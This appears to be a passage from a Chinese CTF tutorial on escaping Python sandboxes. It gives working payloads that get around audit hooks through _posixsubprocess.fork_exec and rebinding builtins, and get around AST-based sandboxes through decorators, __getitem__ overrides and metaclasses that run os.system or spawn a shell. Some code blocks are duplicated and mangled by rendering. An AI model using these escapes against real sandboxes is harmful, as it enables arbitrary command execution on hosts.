class="line"><span class="meta">&gt;&gt;&gt; </span>__loader__</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>&lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib.BuiltinImporter&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__.__base__.__subclasses__()[<span class="number">84</span>].__name__</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;BuiltinImporter&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[x <span class="keyword">for</span> x <span class="keyword">in</span> ().__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&#x27;BuiltinImporter&#x27;</span> <span class="keyword">in</span> x.__name__][<span class="number">0</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>&lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib.BuiltinImporter&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">1</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">2</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">3</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">4</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">5</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">6</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">7</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">8</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__loader__.load_module 也有一个缺点就是无法导入非内建模块. 例如 socket</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__loader__.load_module(<span class="string">&#x27;socket&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>Traceback (most recent call last):</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>File <span class="string">&quot;&lt;frozen importlib._bootstrap&gt;&quot;</span>, line <span class="number">290</span>, <span class="keyword">in</span> _load_module_shim</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>File <span class="string">&quot;&lt;frozen importlib._bootstrap&gt;&quot;</span>, line <span class="number">721</span>, <span class="keyword">in</span> _load</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>File <span class="string">&quot;&lt;frozen importlib._bootstrap&gt;&quot;</span>, line <span class="number">676</span>, <span class="keyword">in</span> _load_unlocked</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>File <span class="string">&quot;&lt;frozen importlib._bootstrap&gt;&quot;</span>, line <span class="number">573</span>, <span class="keyword">in</span> module_from_spec</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>File <span class="string">&quot;&lt;frozen importlib._bootstrap&gt;&quot;</span>, line <span class="number">776</span>, <span class="keyword">in</span> create_module</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ImportError: <span class="string">&#x27;socket&#x27;</span> <span class="keyword">is</span> <span class="keyword">not</span> a built-<span class="keyword">in</span> module</span><br></pre></td></tr></table></figure><h2 id="posixsubprocess-执行命令"><a href="#posixsubprocess-执行命令" class="headerlink" title="_posixsubprocess 执行命令"></a>_posixsubprocess 执行命令</h2><p>_posixsubprocess 模块是 Python 的内部模块，提供了一个用于在 UNIX 平台上创建子进程的低级别接口。subprocess 模块的实现就用到了 _posixsubprocess.</p><p>该模块的核心功能是 <code>fork_exec</code> 函数，<code>fork_exec</code> 提供了一个非常底层的方式来创建一个新的子进程，并在这个新进程中执行一个指定的程序。但这个模块并没有在 Python 的标准库文档中列出,每个版本的 Python 可能有所差异.</p><p>在我本地的 Python 3.11 中具体的函数声明如下:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">fork_exec</span>(<span class="params"></span></span><br><span class="line"><span class="params">    __process_args: <span class="type">Sequence</span>[StrOrBytesPath] | <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    __executable_list: <span class="type">Sequence</span>[<span class="built_in">bytes</span>],</span></span><br><span class="line"><span class="params">    __close_fds: <span class="built_in">bool</span>,</span></span><br><span class="line"><span class="params">    __fds_to_keep: <span class="built_in">tuple</span>[<span class="built_in">int</span>, ...],</span></span><br><span class="line"><span class="params">    __cwd_obj: <span class="built_in">str</span>,</span></span><br><span class="line"><span class="params">    __env_list: <span class="type">Sequence</span>[<span class="built_in">bytes</span>] | <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    __p2cread: <span class="built_in">int</span>,</span></span><br><span class="line"><span class="params">    __p2cwrite: <span class="built_in">int</span>,</span></span><br><span class="line"><span class="params">    __c2pred: <span class="built_in">int</span>,</span></span><br><span class="line"><span class="params">    __c2pwrite: <span class="built_in">int</span>,</span></span><br><span class="line"><span class="params">    __errread: <span class="built_in">int</span>,</span></span><br><span class="line"><span class="params">    __errwrite: <span class="built_in">int</span>,</span></span><br><span class="line"><span class="params">    __errpipe_read: <span class="built_in">int</span>,</span></span><br><span class="line"><span class="params">    __errpipe_write: <span class="built_in">int</span>,</span></span><br><span class="line"><span class="params">    __restore_signals: <span class="built_in">int</span>,</span></span><br><span class="line"><span class="params">    __call_setsid: <span class="built_in">int</span>,</span></span><br><span class="line"><span class="params">    __pgid_to_set: <span class="built_in">int</span>,</span></span><br><span class="line"><span class="params">    __gid_object: SupportsIndex | <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    __groups_list: <span class="built_in">list</span>[<span class="built_in">int</span>] | <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    __uid_object: SupportsIndex | <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    __child_umask: <span class="built_in">int</span>,</span></span><br><span class="line"><span class="params">    __preexec_fn: <span class="type">Callable</span>[[], <span class="literal">None</span>],</span></span><br><span class="line"><span class="params">    __allow_vfork: <span class="built_in">bool</span>,</span></span><br><span class="line"><span class="params"></span>) -&gt; <span class="built_in">int</span>: ...</span><br><span class="line"></span><br><span class="line">__process_args: 传递给新进程的命令行参数，通常为程序路径及其参数的列表。</span><br><span class="line">__executable_list: 可执行程序路径的列表。</span><br><span class="line">__close_fds: 如果设置为<span class="literal">True</span>，则在新进程中关闭所有的文件描述符。</span><br><span class="line">__fds_to_keep: 一个元组，表示在新进程中需要保持打开的文件描述符的列表。</span><br><span class="line">__cwd_obj: 新进程的工作目录。</span><br><span class="line">__env_list: 环境变量列表，它是键和值的序列，例如：[“PATH=/usr/<span class="built_in">bin</span>”, “HOME=/home/user”]。</span><br><span class="line">__p2cread, __p2cwrite, __c2pred, __c2pwrite, __errread, __errwrite: 这些是文件描述符，用于在父子进程间进行通信。</span><br><span class="line">__errpipe_read, __errpipe_write: 这两个文件描述符用于父子进程间的错误通信。</span><br><span class="line">__restore_signals: 如果设置为<span class="number">1</span>，则在新创建的子进程中恢复默认的信号处理。</span><br><span class="line">__call_setsid: 如果设置为<span class="number">1</span>，则在新进程中创建新的会话。</span><br><span class="line">__pgid_to_set: 设置新进程的进程组 ID。</span><br><span class="line">__gid_object, __groups_list, __uid_object: 这些参数用于设置新进程的用户ID 和组 ID。</span><br><span class="line">__child_umask: 设置新进程的 umask。</span><br><span class="line">__preexec_fn: 在新进程中执行的函数，它会在新进程的主体部分执行之前调用。</span><br><span class="line">__allow_vfork: 如果设置为<span class="literal">True</span>，则在可能的情况下使用 vfork 而不是 fork。vfork 是一个更高效的 fork，但是使用 vfork 可能会有一些问题 。</span><br></pre></td></tr></table></figure><p>下面是一个最小化示例:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> _posixsubprocess</span><br><span class="line"></span><br><span class="line">_posixsubprocess.fork_exec([<span class="string">b&quot;/bin/cat&quot;</span>,<span class="string">&quot;/etc/passwd&quot;</span>], [<span class="string">b&quot;/bin/cat&quot;</span>], <span class="literal">True</span>, (), <span class="literal">None</span>, <span class="literal">None</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, *(os.pipe()), <span class="literal">False</span>, <span class="literal">False</span>,<span class="literal">False</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, -<span class="number">1</span>, <span class="literal">None</span>, <span class="literal">False</span>)xxxxxxxxxx <span class="keyword">import</span> osimport _posixsubprocess_posixsubprocess.fork_exec([<span class="string">b&quot;/bin/cat&quot;</span>,<span class="string">&quot;/etc/passwd&quot;</span>], [<span class="string">b&quot;/bin/cat&quot;</span>], <span class="literal">True</span>, (), <span class="literal">None</span>, <span class="literal">None</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, *(os.pipe()), <span class="literal">False</span>, <span class="literal">False</span>,<span class="literal">False</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, -<span class="number">1</span>, <span class="literal">None</span>, <span class="literal">False</span>)<span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span> <span class="keyword">import</span> os <span class="keyword">import</span> _posixsubprocess _posixsubprocess.fork_exec([<span class="string">b&quot;/bin/cat&quot;</span>,<span class="string">&quot;/etc/passwd&quot;</span>], [<span class="string">b&quot;/bin/cat&quot;</span>], <span class="literal">True</span>, (), <span class="literal">None</span>, <span class="literal">None</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, *(os.pipe()), <span class="literal">False</span>, <span class="literal">False</span>,<span class="literal">False</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, -<span class="number">1</span>, <span class="literal">None</span>, <span class="literal">False</span>) </span><br></pre></td></tr></table></figure><p>结合上面的 <strong>loader</strong>.load_module(fullname) 可以得到最终的 payload:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__loader__.load_module(<span class="string">&#x27;_posixsubprocess&#x27;</span>).fork_exec([<span class="string">b&quot;/bin/cat&quot;</span>,<span class="string">&quot;/etc/passwd&quot;</span>], [<span class="string">b&quot;/bin/cat&quot;</span>], <span class="literal">True</span>, (), <span class="literal">None</span>, <span class="literal">None</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, *(__loader__.load_module(<span class="string">&#x27;os&#x27;</span>).pipe()), <span class="literal">False</span>, <span class="literal">False</span>,<span class="literal">False</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, -<span class="number">1</span>, <span class="literal">None</span>, <span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p>可以看到全程触发了 <code>builtins.input/result</code>, <code>compile</code>, <code>exec</code> 三个 hook, 这些 hook 的触发都是因为 input, compile, exec 函数而触发的, <strong>loader</strong>.load_module 和 _posixsubprocess 都没有触发.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[+] builtins.<span class="built_in">input</span>/result, (<span class="string">&#x27;__loader__.load_module(\&#x27;_posixsubprocess\&#x27;).fork_exec([b&quot;/bin/cat&quot;,&quot;/flag&quot;], [b&quot;/bin/cat&quot;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__loader__.load_module(\&#x27;os\&#x27;).pipe()), False, False,False, None, None, None, -1, None, False)&#x27;</span>,)</span><br><span class="line">[+] <span class="built_in">compile</span>, (<span class="string">b&#x27;__loader__.load_module(\&#x27;_posixsubprocess\&#x27;).fork_exec([b&quot;/bin/cat&quot;,&quot;/flag&quot;], [b&quot;/bin/cat&quot;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__loader__.load_module(\&#x27;os\&#x27;).pipe()), False, False,False, None, None, None, -1, None, False)&#x27;</span>, <span class="string">&#x27;&lt;string&gt;&#x27;</span>)</span><br><span class="line">[+] <span class="built_in">exec</span>, (&lt;code <span class="built_in">object</span> &lt;module&gt; at <span class="number">0x7fbecc924670</span>, file <span class="string">&quot;&lt;string&gt;&quot;</span>, line <span class="number">1</span>&gt;,)</span><br></pre></td></tr></table></figure><p>另一种解法: <code>篡改内置函数</code></p><p>这道 audit hook 题还有另外一种解法.可以看到白名单是通过 set 函数返回的, <code>set</code> 作为一个内置函数实际上也是可以修改的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">WHITED_EVENTS = <span class="built_in">set</span>(&#123;<span class="string">&#x27;builtins.input&#x27;</span>, <span class="string">&#x27;builtins.input/result&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>&#125;) </span><br><span class="line"></span><br><span class="line">比如我们将 <span class="built_in">set</span> 函数修改为固定返回一个包含了 os.system 函数的列表 </span><br><span class="line"></span><br><span class="line">__builtins__.<span class="built_in">set</span> = <span class="keyword">lambda</span> x: [<span class="string">&#x27;builtins.input&#x27;</span>, <span class="string">&#x27;builtins.input/result&#x27;</span>,<span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;os.system&#x27;</span>] </span><br><span class="line"><span class="number">1</span></span><br><span class="line">这样 <span class="built_in">set</span> 函数会固定返回带有 os.system 的列表.</span><br><span class="line"></span><br><span class="line">__builtins__.<span class="built_in">set</span> = <span class="keyword">lambda</span> x: [<span class="string">&#x27;builtins.input&#x27;</span>, <span class="string">&#x27;builtins.input/result&#x27;</span>,<span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;os.system&#x27;</span>] </span><br><span class="line"><span class="number">1</span></span><br><span class="line">最终 payload:</span><br><span class="line"></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="built_in">exec</span>(<span class="string">&quot;for k,v in enumerate(globals()[&#x27;__builtins__&#x27;]): print(k,v)&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="篡改函数"><a href="#篡改函数" class="headerlink" title="篡改函数"></a>篡改函数</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span>(<span class="string">&quot;globals()[&#x27;__builtins__&#x27;][&#x27;set&#x27;]=lambda x: [&#x27;builtins.input&#x27;, &#x27;builtins.input/result&#x27;,&#x27;exec&#x27;, &#x27;compile&#x27;, &#x27;os.system&#x27;]\nimport os\nos.system(&#x27;cat flag2.txt&#x27;)&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="其他不触发-hook-的方式"><a href="#其他不触发-hook-的方式" class="headerlink" title="其他不触发 hook 的方式"></a>其他不触发 hook 的方式</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">使用 __loader__.load_module(<span class="string">&#x27;os&#x27;</span>) 是为了获取 os 模块, 其实在 no builtins 利用手法中, 无需导入也可以获取对应模块. 例如:</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取 sys</span></span><br><span class="line"></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;sys&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;sys&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取 os</span></span><br><span class="line"></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;&#x27;_sitebuiltins.&quot;</span> <span class="keyword">in</span> <span class="built_in">str</span>(x) <span class="keyword">and</span> <span class="keyword">not</span> <span class="string">&quot;_Helper&quot;</span> <span class="keyword">in</span> <span class="built_in">str</span>(x) ][<span class="number">0</span>][<span class="string">&quot;sys&quot;</span>].modules[<span class="string">&quot;os&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 其他的 payload 也都不会触发</span></span><br><span class="line"></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__==<span class="string">&quot;_wrap_close&quot;</span>][<span class="number">0</span>][<span class="string">&quot;system&quot;</span>](<span class="string">&quot;ls&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="绕过-AST-沙箱"><a href="#绕过-AST-沙箱" class="headerlink" title="绕过 AST 沙箱"></a>绕过 AST 沙箱</h2><p>AST 沙箱会将用户的输入转化为操作码,此时字符串层面的变换基本上没用了,一般情况下考虑绕过 AST 黑名单. 例如下面的沙箱禁止了 ast.Import|ast.ImportFrom|ast.Call 这三类操作, 这样一来就无法导入模块和执行函数.</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ast</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">verify_secure</span>(<span class="params">m</span>):</span><br><span class="line">  <span class="keyword">for</span> x <span class="keyword">in</span> ast.walk(m):</span><br><span class="line">    <span class="keyword">match</span> <span class="built_in">type</span>(x):</span><br><span class="line">      <span class="keyword">case</span> (ast.Import|ast.ImportFrom|ast.Call):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;ERROR: Banned statement <span class="subst">&#123;x&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">abspath = os.path.abspath(__file__)</span><br><span class="line">dname = os.path.dirname(abspath)</span><br><span class="line">os.chdir(dname)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;-- Please enter code (last line must contain only --END)&quot;</span>)</span><br><span class="line">source_code = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">  line = sys.stdin.readline()</span><br><span class="line">  <span class="keyword">if</span> line.startswith(<span class="string">&quot;--END&quot;</span>):</span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line">  source_code += line</span><br><span class="line"></span><br><span class="line">tree = <span class="built_in">compile</span>(source_code, <span class="string">&quot;input.py&quot;</span>, <span class="string">&#x27;exec&#x27;</span>, flags=ast.PyCF_ONLY_AST)</span><br><span class="line"><span class="keyword">if</span> verify_secure(tree):  <span class="comment"># Safe to execute!</span></span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;-- Executing safe code:&quot;</span>)</span><br><span class="line">  compiled = <span class="built_in">compile</span>(source_code, <span class="string">&quot;input.py&quot;</span>, <span class="string">&#x27;exec&#x27;</span>)</span><br><span class="line">  <span class="built_in">exec</span>(compiled)</span><br></pre></td></tr></table></figure><p>下面的几种利用方式来源于 hacktricks</p><h3 id="without-call"><a href="#without-call" class="headerlink" title="without call"></a>without call</h3><p>如果基于 AST 的沙箱限制了执行函数,那么就需要找到一种不需要执行函数的方式执行系统命令.</p><p><code>装饰器</code></p><p>利用 payload 如下:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@exec</span></span><br><span class="line"><span class="meta">@input</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">X</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>当我们输入上述的代码后, Python 会打开输入,此时我们再输入 payload 就可以成功执行命令.</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@exec</span></span><br><span class="line"><span class="meta"> @input</span></span><br><span class="line"> <span class="keyword">class</span> <span class="title class_">X</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;__main__.X&#x27;</span>&gt;<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"></span><br><span class="line">由于装饰器不会被解析为调用表达式或语句, 因此可以绕过黑名单, 最终传入的 payload 是由 <span class="built_in">input</span> 接收的, 因此也不会被拦截.</span><br><span class="line"></span><br><span class="line">其实这样的话,构造其实可以有很多,比如直接打开 <span class="built_in">help</span> 函数.</span><br><span class="line"></span><br><span class="line"><span class="meta">@help</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">X</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">3</span></span><br><span class="line">这样可以直接进入帮助文档:</span><br><span class="line"></span><br><span class="line">Help on <span class="keyword">class</span> <span class="title class_">X</span> <span class="keyword">in</span> module __main__:</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">X</span>(builtins.<span class="built_in">object</span>)</span><br><span class="line"> |  Data descriptors defined here:</span><br><span class="line"> |  </span><br><span class="line"> |  __dict__</span><br><span class="line"> |      dictionary <span class="keyword">for</span> instance variables (<span class="keyword">if</span> defined)</span><br><span class="line"> |  </span><br><span class="line"> |  __weakref__</span><br><span class="line"> |      <span class="built_in">list</span> of weak references to the <span class="built_in">object</span> (<span class="keyword">if</span> defined)</span><br><span class="line">(END)xxxxxxxxxx Help on <span class="keyword">class</span> <span class="title class_">X</span> <span class="keyword">in</span> module __main__:<span class="keyword">class</span> <span class="title class_">X</span>(builtins.<span class="built_in">object</span>) |  Data descriptors defined here: |   |  __dict__ |      dictionary <span class="keyword">for</span> instance variables (<span class="keyword">if</span> defined) |   |  __weakref__ |      <span class="built_in">list</span> of weak references to the <span class="built_in">object</span> (<span class="keyword">if</span> defined)(END)<span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span> <span class="number">5</span> <span class="number">6</span> <span class="number">7</span> <span class="number">8</span> <span class="number">9</span> <span class="number">10</span> <span class="number">11</span> Help on <span class="keyword">class</span> <span class="title class_">X</span> <span class="keyword">in</span> module __main__: <span class="keyword">class</span> <span class="title class_">X</span>(builtins.<span class="built_in">object</span>) |  Data descriptors defined here: |   |  __dict__ |      dictionary <span class="keyword">for</span> instance variables (<span class="keyword">if</span> defined) |   |  __weakref__ |      <span class="built_in">list</span> of weak references to the <span class="built_in">object</span> (<span class="keyword">if</span> defined) (END) </span><br><span class="line"></span><br><span class="line">再次输入 !sh 即可打开 /<span class="built_in">bin</span>/sh</span><br></pre></td></tr></table></figure><h2 id="函数覆盖"><a href="#函数覆盖" class="headerlink" title="函数覆盖"></a>函数覆盖</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">我们知道在 Python 中获取一个的属性例如 obj[argument] 实际上是调用的 obj.__getitem__ 方法.因此我们只需要覆盖其 __getitem__ 方法, 即可在使用 obj[argument] 执行代码:</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">class</span> <span class="title class_">A</span>:</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>...     __getitem__ = <span class="built_in">exec</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>... </span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>A()[<span class="string">&#x27;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">1</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">2</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">3</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">4</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>但是这里调用了 A 的构造函数, 因此 AST 中还是会出现 ast.Call。</span><br></pre></td></tr></table></figure><h2 id="metaclass-利用（如何在不执行构造函数的情况下获取类实例呢-）"><a href="#metaclass-利用（如何在不执行构造函数的情况下获取类实例呢-）" class="headerlink" title="metaclass 利用（如何在不执行构造函数的情况下获取类实例呢?）"></a>metaclass 利用（如何在不执行构造函数的情况下获取类实例呢?）</h2><p>Python 中提供了一种元类(metaclass)概念。元类是创建类的“类”。在 Python中，类本身也是对象，元类就是创建这些类（即类的对象）的类。</p><p>元类在 Python 中的作用主要是用来创建类。类是对象的模板，而元类则是类的模板。元类定义了类的行为和属性，就像类定义了对象的行为和属性一样。</p><p>下面是基于元类的 payload, 在不使用构造函数的情况下触发</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Metaclass</span>(<span class="title class_ inherited__">type</span>):</span><br><span class="line">    __getitem__ = <span class="built_in">exec</span> </span><br><span class="line">    </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Sub</span>(metaclass=Metaclass):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">Sub[<span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>]</span><br></pre></td></tr></table></figure><p>除了 <strong>getitem</strong> 之外其他方法的利用方式如下:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 